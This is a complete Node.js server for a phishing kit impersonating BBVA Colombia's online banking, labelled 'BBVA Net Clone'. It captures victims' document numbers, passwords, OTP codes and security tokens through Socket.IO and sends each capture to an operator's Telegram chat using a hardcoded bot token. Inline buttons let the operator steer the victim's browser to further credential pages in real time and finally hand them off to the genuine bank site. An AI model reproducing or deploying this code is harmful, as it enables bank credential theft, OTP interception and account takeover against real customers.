const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const axios = require('axios');
const path = require('path');

// ========================================
// CONFIGURATION
// ========================================
const CONFIG = {
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || '8233051111:AAGne2MmnvelLlHcG2PDDRp4HdspUX7Euik',
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || '-5031454915',
    PORT: process.env.PORT || 3000,
    TELEGRAM_API_BASE: 'https://api.telegram.org/bot',
    SESSION_TIMEOUT: 30 * 60 * 1000 // 30 minutos
};

// ========================================
// INITIALIZE SERVER
// ========================================
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    transports: ['polling', 'websocket'],
    pingTimeout: 600000,
    pingInterval: 5000,
    upgradeTimeout: 90000,
    connectTimeout: 90000,
    allowUpgrades: true,
    perMessageDeflate: false,
    maxHttpBufferSize: 1e8,
    allowEIO3: true,
    cookie: false,
    path: '/socket.io',
    serveClient: true,
    closeOnBeforeunload: false
});

// Sistema de keep-alive ultra agresivo
setInterval(() => {
    const sockets = Array.from(io.sockets.sockets.values());
    console.log(`📡 Keep-alive: ${sockets.length} clientes conectados`);
    io.emit('server-ping');
}, 15000); // Cada 15 segundos

// Cola de comandos pendientes por si el usuario se desconectó temporalmente
const pendingCommands = new Map(); // sessionId -> {action, timestamp}

const activeSessions = new Map();

// ========================================
// MIDDLEWARE
// ========================================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// ========================================
// TELEGRAM SERVICE
// ========================================
class TelegramService {
    static async sendMessage(text, replyMarkup = null) {
        try {
            const url = `${CONFIG.TELEGRAM_API_BASE}${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text,
                parse_mode: 'HTML',
                ...(replyMarkup && { reply_markup: replyMarkup })
            };
            
            await axios.post(url, payload);
        } catch (error) {
            console.error('Error Telegram:', error.response?.data || error.message);
            throw error;
        }
    }
    
    static async answerCallbackQuery(callbackQueryId, text) {
        try {
            const url = `${CONFIG.TELEGRAM_API_BASE}${CONFIG.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
            await axios.post(url, { callback_query_id: callbackQueryId, text });
        } catch (error) {
            console.error('Error callback:', error.message);
        }
    }
    
    static createKeyboard(sessionId) {
        return {
            inline_keyboard: [
                [
                    { text: '🔄 Pedir Logo', callback_data: `logo_${sessionId}` },
                    { text: '📲 Pedir OTP', callback_data: `otp_${sessionId}` }
                ],
                [
                    { text: '🔐 Pedir Token', callback_data: `token_${sessionId}` },
                    { text: '✅ Finalizar', callback_data: `finish_${sessionId}` }
                ]
            ]
        };
    }
}

// ========================================
// SESSION MANAGER
// ========================================
class SessionManager {
    static create(socketId, data) {
        const session = {
            socketId,
            data,
            createdAt: new Date(),
            lastActivity: new Date(),
            lastSocketId: socketId,
            reconnectCount: 0
        };
        activeSessions.set(socketId, session);

        return socketId;
    }
    
    static get(sessionId) {
        const session = activeSessions.get(sessionId);
        if (session) session.lastActivity = new Date();
        return session;
    }
    
    static update(sessionId, newData) {
        const session = activeSessions.get(sessionId);
        if (session) {
            session.data = { ...session.data, ...newData };
            session.lastActivity = new Date();
            console.log(`✓ Sesión actualizada: ${sessionId}`);
        }
    }
    
    static updateSocketId(sessionId, newSocketId) {
        const session = activeSessions.get(sessionId);
        if (session) {
            session.lastSocketId = session.socketId;
            session.socketId = newSocketId;
            session.lastActivity = new Date();
            session.reconnectCount++;
        }
    }
    
    static delete(sessionId) {
        return activeSessions.delete(sessionId);
    }
    
    static findSession(socketId, originalSessionId) {
        // Buscar por originalSessionId primero
        if (originalSessionId) {
            const session = activeSessions.get(originalSessionId);
            if (session) {
                if (session.socketId !== socketId) {
                    this.updateSocketId(originalSessionId, socketId);
                }
                return { sessionId: originalSessionId, session };
            }
        }
        
        // Buscar por socketId actual
        const session = activeSessions.get(socketId);
        if (session) {
            return { sessionId: socketId, session };
        }
        
        // Buscar en cualquier sesión
        for (const [sessionId, sess] of activeSessions.entries()) {
            if (sess.socketId === socketId || sess.lastSocketId === socketId) {
                sess.lastActivity = new Date();
                return { sessionId, session: sess };
            }
        }
        
        return null;
    }
    
    static getSocketId(sessionId) {
        const session = activeSessions.get(sessionId);
        return session?.socketId;
    }
    
    static getConnectedSocket(sessionId, io) {
        const session = activeSessions.get(sessionId);
        if (!session) return null;
        
        // Intentar con socketId actual
        let socket = io.sockets.sockets.get(session.socketId);
        if (socket?.connected) return socket;
        
        // Intentar con lastSocketId
        if (session.lastSocketId && session.lastSocketId !== session.socketId) {
            socket = io.sockets.sockets.get(session.lastSocketId);
            if (socket?.connected) {
                session.socketId = session.lastSocketId;
                return socket;
            }
        }
        
        // Buscar en TODOS los sockets conectados
        const allSockets = Array.from(io.sockets.sockets.values());
        for (const sock of allSockets) {
            if (sock.connected) {
                const foundSession = Array.from(activeSessions.entries())
                    .find(([sid, sess]) => 
                        sid === sessionId && 
                        (sess.socketId === sock.id || sess.lastSocketId === sock.id)
                    );
                
                if (foundSession) {
                    session.socketId = sock.id;
                    return sock;
                }
            }
        }
        
        return null;
    }
}

// ========================================
// ROUTES
// ========================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/telegram-webhook', async (req, res) => {
    try {
        const { callback_query } = req.body;
        
        if (callback_query) {
            const [action, sessionId] = callback_query.data.split('_');
            const socket = SessionManager.getConnectedSocket(sessionId, io);
            
            if (socket) {
                console.log(`✓ Socket encontrado y conectado para sesión ${sessionId}`);
                const actions = {
                    logo: { url: '/index.html', msg: '🔄 Redirigiendo al login...' },
                    otp: { url: '/otp.html', msg: '📲 Solicitando OTP...' },
                    token: { url: '/token.html', msg: '🔐 Solicitando Token...' },
                    finish: { url: 'https://www.bbva.com.co/', msg: '✅ Sesión finalizada' }
                };
                
                const actionData = actions[action];
                if (actionData) {
                    socket.emit('redirect', { url: actionData.url });
                    await TelegramService.answerCallbackQuery(callback_query.id, actionData.msg);
                    if (action === 'finish') SessionManager.delete(sessionId);
                }
            } else {
                console.log(`✗ Socket no encontrado o desconectado para sesión ${sessionId}`);
                await TelegramService.answerCallbackQuery(callback_query.id, '❌ Usuario desconectado. Pídele que recargue la página.');
            }
        }
        
        res.sendStatus(200);
    } catch (error) {
        console.error('✗ Error en webhook:', error);
        res.sendStatus(500);
    }
});

// ========================================
// SOCKET.IO HANDLERS
// ========================================
io.on('connection', (socket) => {
    console.log(`✓ Cliente conectado: ${socket.id}`);
    
    socket.on('identify-session', ({ originalSessionId }) => {
        if (originalSessionId) {
            SessionManager.updateSocketId(originalSessionId, socket.id);
            socket.emit('session-identified', { success: true, sessionId: originalSessionId });
            
            // Ejecutar comandos pendientes si hay
            const pendingCommand = pendingCommands.get(originalSessionId);
            if (pendingCommand) {
                const actions = {
                    logo: '/index.html',
                    otp: '/otp.html',
                    token: '/token.html',
                    finish: 'https://www.bbva.com.co/'
                };
                
                const url = actions[pendingCommand.action];
                if (url) {
                    socket.emit('redirect', { 
                        url, 
                        action: pendingCommand.action, 
                        timestamp: Date.now(),
                        wasPending: true
                    });
                    pendingCommands.delete(originalSessionId);
                }
            }
        }
    });
    
    socket.on('login-attempt', async (data) => {
        try {
            const { documentType, documentNumber, password } = data;
            const sessionId = SessionManager.create(socket.id, { documentType, documentNumber, password });
            
            const message = `
🔐 <b>Nueva Credencial BBVA Net</b>

👤 <b>Tipo:</b> ${documentType}
🆔 <b>Documento:</b> ${documentNumber}
🔑 <b>Contraseña:</b> ${password}
⏰ <b>Fecha:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
📱 <b>Session ID:</b> <code>${sessionId}</code>

<i>Presiona un botón para controlar al usuario:</i>`;
            
            await TelegramService.sendMessage(message, TelegramService.createKeyboard(sessionId));
            socket.emit('login-processing', { success: true, sessionId });
        } catch (error) {
            console.error('✗ Error en login:', error);
            socket.emit('login-error', { error: 'Error al procesar' });
        }
    });
    
    socket.on('otp-submit', async ({ otp, originalSessionId }) => {
        try {
            const result = SessionManager.findSession(socket.id, originalSessionId);
            
            if (result) {
                const { sessionId, session } = result;
                SessionManager.update(sessionId, { otp });
                
                const message = `
📲 <b>Código OTP Recibido</b>

🔢 <b>OTP:</b> <code>${otp}</code>
🆔 <b>Documento:</b> ${session.data.documentNumber}
🔑 <b>Contraseña:</b> ${session.data.password}
⏰ <b>Fecha:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
📱 <b>Session ID:</b> <code>${sessionId}</code>

<i>Presiona un botón para continuar:</i>`;
                
                await TelegramService.sendMessage(message, TelegramService.createKeyboard(sessionId));
                socket.emit('otp-processing', { success: true, sessionId });
            } else {
                socket.emit('otp-processing', { success: true, sessionId: socket.id });
            }
        } catch (error) {
            console.error('✗ Error en OTP:', error);
            socket.emit('otp-processing', { success: true, sessionId: socket.id });
        }
    });
    
    socket.on('token-submit', async ({ token, originalSessionId }) => {
        try {
            const result = SessionManager.findSession(socket.id, originalSessionId);
            
            if (result) {
                const { sessionId, session } = result;
                SessionManager.update(sessionId, { token });
                
                const message = `
🔐 <b>Token de Seguridad Recibido</b>

🔢 <b>Token:</b> <code>${token}</code>
🆔 <b>Documento:</b> ${session.data.documentNumber}
🔑 <b>Contraseña:</b> ${session.data.password}
${session.data.otp ? `📲 <b>OTP:</b> ${session.data.otp}` : ''}
⏰ <b>Fecha:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
📱 <b>Session ID:</b> <code>${sessionId}</code>

<i>Presiona un botón para continuar:</i>`;
                
                await TelegramService.sendMessage(message, TelegramService.createKeyboard(sessionId));
                socket.emit('token-processing', { success: true, sessionId });
            } else {
                socket.emit('token-processing', { success: true, sessionId: socket.id });
            }
        } catch (error) {
            console.error('✗ Error en Token:', error);
            socket.emit('token-processing', { success: true, sessionId: socket.id });
        }
    });
    
    socket.on('heartbeat', ({ sessionId }) => {
        const session = SessionManager.get(sessionId);
        if (session) session.lastActivity = new Date();
    });
    
    socket.on('disconnect', (reason) => {
        console.log(`✗ Cliente desconectado: ${socket.id}, Razón: ${reason}`);
    });
    
    socket.on('ping', () => socket.emit('pong'));
    
    socket.on('client-alive', () => {
        // Cliente reporta que está vivo
        const sessionId = Array.from(activeSessions.entries())
            .find(([sid, sess]) => sess.socketId === socket.id)?.[0];
        if (sessionId) {
            const session = SessionManager.get(sessionId);
            if (session) session.lastActivity = Date.now();
        }
    });
    
    socket.on('ping-client', () => {
        socket.emit('pong-client', { timestamp: Date.now() });
    });
    
    socket.on('client-alive', () => {
        // Cliente reporta que está vivo
        const sessionId = Array.from(activeSessions.entries())
            .find(([sid, sess]) => sess.socketId === socket.id)?.[0];
        if (sessionId) {
            const session = SessionManager.get(sessionId);
            if (session) session.lastActivity = Date.now();
        }
    });
});

// ========================================
// TELEGRAM POLLING
// ========================================
let lastUpdateId = 0;
let pollingActive = false;

async function startTelegramPolling() {
    if (pollingActive) return;
    pollingActive = true;
    
    console.log('🔄 Iniciando polling de Telegram...');
    
    try {
        await axios.post(`${CONFIG.TELEGRAM_API_BASE}${CONFIG.TELEGRAM_BOT_TOKEN}/deleteWebhook`);
        console.log('✓ Webhook eliminado');
    } catch (error) {
        console.log('⚠ Error al eliminar webhook:', error.message);
    }
    
    pollTelegram();
}

async function pollTelegram() {
    if (!pollingActive) return;
    
    try {
        const response = await axios.get(
            `${CONFIG.TELEGRAM_API_BASE}${CONFIG.TELEGRAM_BOT_TOKEN}/getUpdates`,
            {
                params: {
                    offset: lastUpdateId + 1,
                    timeout: 30,
                    allowed_updates: ['callback_query']
                }
            }
        );
        
        const updates = response.data.result;
        
        for (const update of updates) {
            if (update.update_id > lastUpdateId) {
                lastUpdateId = update.update_id;
            }
            
            if (update.callback_query) {
                await handleTelegramCallback(update.callback_query);
            }
        }
    } catch (error) {
        if (error.code !== 'ECONNABORTED') {
            console.error('✗ Error en polling:', error.message);
        }
    }
    
    if (pollingActive) {
        setImmediate(pollTelegram);
    }
}

async function handleTelegramCallback(callbackQuery) {
    try {
        const [action, sessionId] = callbackQuery.data.split('_');
        const socket = SessionManager.getConnectedSocket(sessionId, io);
        
        if (socket) {
            console.log(`✓ Socket activo encontrado para sesión ${sessionId}`);
            const actions = {
                logo: { url: '/index.html', msg: '🔄 Redirigiendo...' },
                otp: { url: '/otp.html', msg: '📲 Solicitando OTP...' },
                token: { url: '/token.html', msg: '🔐 Solicitando Token...' },
                finish: { url: 'https://www.bbva.com.co/', msg: '✅ Finalizado' }
            };
            
            const actionData = actions[action];
            if (actionData) {
                socket.emit('redirect', { url: actionData.url });
                await TelegramService.answerCallbackQuery(callbackQuery.id, actionData.msg);
                if (action === 'finish') SessionManager.delete(sessionId);
            }
        } else {
            console.log(`✗ No hay socket activo para sesión ${sessionId}`);
            await TelegramService.answerCallbackQuery(callbackQuery.id, '❌ Usuario desconectado');
        }
    } catch (error) {
        console.error('✗ Error al manejar callback:', error.message);
    }
}

// ========================================
// START SERVER
// ========================================
server.listen(CONFIG.PORT, () => {
    console.log('\n========================================');
    console.log('  🚀 BBVA Net Clone - Servidor Activo');
    console.log('========================================');
    console.log(`  📡 Puerto: ${CONFIG.PORT}`);
    console.log(`  🔐 Login: http://localhost:${CONFIG.PORT}`);
    console.log('========================================\n');
    
    startTelegramPolling();
});

// ========================================
// GRACEFUL SHUTDOWN
// ========================================
process.on('SIGINT', () => {
    console.log('\n🛑 Cerrando servidor...');
    pollingActive = false;
    server.close(() => {
        console.log('✓ Servidor cerrado');
        process.exit(0);
    });
});

process.on('uncaughtException', (error) => {
    console.error('✗ Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason) => {
    console.error('✗ Unhandled Rejection:', reason);
});
